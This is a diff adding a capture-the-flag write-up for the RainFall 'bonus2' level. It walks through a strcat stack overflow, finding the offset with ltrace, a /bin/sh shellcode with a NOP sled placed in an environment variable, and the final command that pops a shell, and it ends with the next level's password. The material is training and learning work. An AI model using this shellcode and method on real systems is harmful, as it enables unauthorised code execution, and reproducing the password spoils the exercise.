@@ -1,0 +1,73 @@
+in this level the program takes 3 arguments
+
+the it copy both the arguments in  variables with strncpy
+
+then it checks the env variable "LANG" to see if its equal to "en" , "fi", "nl"
+
+for each of these the program set the global variable to 0, 1 or 2
+and then it call the function greetuser with first argument as parameter
+
+funciton greetuser will strcat av[1] and a string depending of the value of id
+
+so we will try to crash the program
+
+
+$ ltrace -i ./bonus2 $(python -c 'print("B"*99)') $(python -c 'print("A"*99)')
+[0x80483f1] __libc_start_main(0x8048529, 3, 0xbffff634, 0x8048640, 0x80486b0 <unfinished ...>
+[0x804857c] strncpy(0xbffff530, "BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB"..., 40)                                           = 0xbffff530
+[0x804859f] strncpy(0xbffff558, "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"..., 32)                                           = 0xbffff558
+[0x80485ab] getenv("LANG")                                                                                           = "en_US.UTF-8"
+[0x80485db] memcmp(0xbffffe33, 0x804873d, 2, 0xb7fff918, 0)                                                          = -1
+[0x804860a] memcmp(0xbffffe33, 0x8048740, 2, 0xb7fff918, 0)                                                          = -1
+[0x804851c] strcat("Hello ", "BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB"...)                                                  = "Hello BBBBBBBBBBBBBBBBBBBBBBBBBB"...
+[0x8048527] puts("Hello BBBBBBBBBBBBBBBBBBBBBBBBBB"...Hello BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+)                                                              = 79
+[0x8004141] --- SIGSEGV (Segmentation fault) ---
+[0xffffffff] +++ killed by SIGSEGV +++
+
+
+
+
+[0x8004141] --- SIGSEGV (Segmentation fault) ---
+so we have a segfault... but we couldnt override all the address...
+since our LANG is english the buffer only hold "Hello " lets try "fi" so we have a  longer one
+
+$ export LANG=fi
+$ ltrace -i ./bonus2 $(python -c 'print("B"*99)') $(python -c 'print("123456789112233445566778899")')
+[0x80483f1] __libc_start_main(0x8048529, 3, 0xbffff684, 0x8048640, 0x80486b0 <unfinished ...>
+[0x804857c] strncpy(0xbffff580, "BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB"..., 40)                                           = 0xbffff580
+[0x804859f] strncpy(0xbffff5a8, "123456789112233445566778899", 32)                                                   = 0xbffff5a8
+[0x80485ab] getenv("LANG")                                                                                           = "fi"
+[0x80485db] memcmp(0xbffffe55, 0x804873d, 2, 0xb7fff918, 0)                                                          = 0
+[0x804851c] strcat("Hyv\303\244\303\244 p\303\244iv\303\244\303\244 ", "BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB"...)        = "Hyv\303\244\303\244 p\303\244iv\303\244\303\244 BBBBBBBBBBBBBB"...
+[0x8048527] puts("Hyv\303\244\303\244 p\303\244iv\303\244\303\244 BBBBBBBBBBBBBB"...Hyvää päivää BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB123456789112233445566778899
+)                                = 86
+[0x37363635] --- SIGSEGV (Segmentation fault) ---
+[0xffffffff] +++ killed by SIGSEGV +++
+
+
+
+
+[0x37363635] --- SIGSEGV (Segmentation fault) ---  yes, we overwritten the instruction pointer, now we need to load shellcode in env
+and overwrite intruction point with shellcode address
+the offset is at the position 5667 so we replace these with shellcode address
+
+
+
+export SC=$(python -c 'print("\x90"*200+"\x99\xf7\xe2\x8d\x08\xbe\x2f\x2f\x73\x68\xbf\x2f\x62\x69\x6e\x51\x56\x57\x8d\x1c\x24\xb0\x0b\xcd\x80")')
+
+
+(gdb) x/150s envrion
+...
+0xbffffe5a:	 "SC=\220\220\220\220\220\220\220\220\220\220\...
+...
+
+we need to pick address in the nop in shellcode
+
+for example 0xbffffe61
+
+bonus2@RainFall:~$ ./bonus2 $(python -c 'print("B"*99)') $(python -c 'print("123456789112233445"+"\xbf\xff\xfe\x61"[::-1]+"78899")')
+Hyvää päivää BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB123456789112233445a���78899
+$ cd ../bonus3 && cat .pass
+71d449df0f960b36e0055eb58c14d0f5d0ddc0b35328d657f91cf0df15910587
+
